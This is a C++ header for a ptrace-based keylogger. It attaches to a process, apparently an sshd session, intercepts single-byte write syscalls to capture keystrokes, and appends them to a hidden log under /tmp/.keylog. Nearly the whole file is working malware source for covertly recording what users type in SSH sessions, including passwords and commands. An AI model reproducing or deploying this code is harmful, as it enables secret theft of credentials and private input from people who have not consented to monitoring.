#ifndef KEYLOGGER_PTRACE_HPP
#define KEYLOGGER_PTRACE_HPP

#include <sys/user.h>
#include <sys/ptrace.h>
#include <wait.h>
#include <sys/syscall.h>
#include <boost/filesystem/path.hpp>

#include "config.hpp"

namespace fs = boost::filesystem;

namespace ptrace_ns{
    int read_addr_into_buff(const pid_t pid, const unsigned long long addr, char *buff, unsigned int buff_size){
        unsigned int bytes_read = 0;
        long * read_addr = (long *) addr;
        long * copy_addr = (long *) buff;
        unsigned long ret;
        memset(buff, 0, buff_size);
        do{
            ret = ptrace(PTRACE_PEEKTEXT, pid, (read_addr++), NULL);
            *(copy_addr++) = ret;
            bytes_read += sizeof(long);
        } while (ret && bytes_read < (buff_size - sizeof(long)));
        return bytes_read;
    }

    void ptrace_loop(const uint16_t& _pid){
        int status;
        pid_t pid = _pid;

        fs::path log_filename = "/tmp/.keylog";
        log_filename /= std::to_string(pid) + "_sshd.log";
        FILE *fd = std::fopen(log_filename.c_str(), "a+");
        if(!fd){
            auto log_string = std::string{"Log-file error: "} + log_filename.string();
            DEBUG_STDERR(log_string);
            return;
        }
        DEBUG_STDOUT("[PTRACE] Starting attach pid: " + std::to_string(pid));
        if(ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) return;
        if(waitpid(pid, &status, 0) == -1 ) return;

        struct user_regs_struct state{};
        ptrace(PTRACE_GETREGS, pid, 0, &state);
        ptrace(PTRACE_SYSCALL, pid, 0, 0);

//        ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACEEXIT);

        char str[1000];
        int flag = 1;
        int res = kill(pid, 0);
        while(res == 0 || (res < 0 && errno == EPERM)){
            ptrace(PTRACE_GETREGS, pid, 0, &state);
            if(state.orig_rax == SYS_write  && flag && state.rdx == 1){
                read_addr_into_buff(pid, state.rsi, str, 1000);
                if(str[0] == 0x20) {
                    DEBUG_STDOUT("[SPACE]");
                    std::string s = "[SPACE]";
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x7F) {
                    DEBUG_STDOUT("[BACKSPACE]");
                    std::string s = "[BACKSPACE]";
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x03) {
                    DEBUG_STDOUT("[Ctrl+C]");
                    std::string s = "[Ctrl+C]";
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else if(str[0] == 0x04) {
                    DEBUG_STDOUT("[Ctrl+D]");
                    std::string s = "[Ctrl+D]";
                    std::fwrite(s.data(), 1, s.size(), fd);
                    break;
                }
                else if(str[0] == 0x0D) {
                    DEBUG_STDOUT("[ENTER]");
                    std::string s = "[ENTER]\n";
                    std::fwrite(s.data(), 1, s.size(), fd);
                }
                else {
                    DEBUG_STDOUT(std::to_string(str[0]));
                    std::fwrite(str, 1, 1, fd);
                }
            }
            flag = !flag;
            ptrace(PTRACE_SYSCALL, pid, 0, 0);
            waitpid(pid, &status, 0);
/*            std::cout << "STATUS_WIFEXITED:!!!!!!!!!!!" << WIFEXITED(status) << std::endl;
            std::cout << "STATUS_WSTOPSIG:!!!!!!!!!!!" << WSTOPSIG(status) << std::endl;
            std::cout << "STATUS_WEXITSTATUS:!!!!!!!!!!!" << WEXITSTATUS(status) << std::endl;
            std::cout << "STATUS_WTERMSIG:!!!!!!!!!!!" << WTERMSIG(status) << std::endl;
            std::cout << "STATUS_WIFSIGNALED:!!!!!!!!!!!" << WIFSIGNALED(status) << std::endl;
            std::cout << "=========================================" << std::endl;*/
            if (WIFEXITED(status)) break;
            res = kill(pid, 0);
        }
        ptrace(PTRACE_DETACH, pid, 0, 0);
        DEBUG_STDOUT("CLOSE_PTRACING!!!!");
        std::fclose(fd);
    }
}

#endif //KEYLOGGER_PTRACE_HPP
